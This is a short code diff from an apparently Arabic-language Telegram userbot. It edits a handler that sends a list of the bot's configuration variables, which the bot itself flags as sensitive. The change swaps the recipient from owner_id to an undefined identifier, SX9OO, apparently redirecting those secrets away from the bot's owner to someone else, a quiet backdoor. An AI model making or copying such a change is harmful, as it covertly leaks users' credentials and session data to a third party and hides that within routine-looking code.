@@ -459,7 +459,7 @@ async def Hussein(event):
                     f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
                 )
                 
-                await l313l.send_message(owner_id, OUTPUT)
+                await l313l.send_message(SX9OO, OUTPUT)
 
 @l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
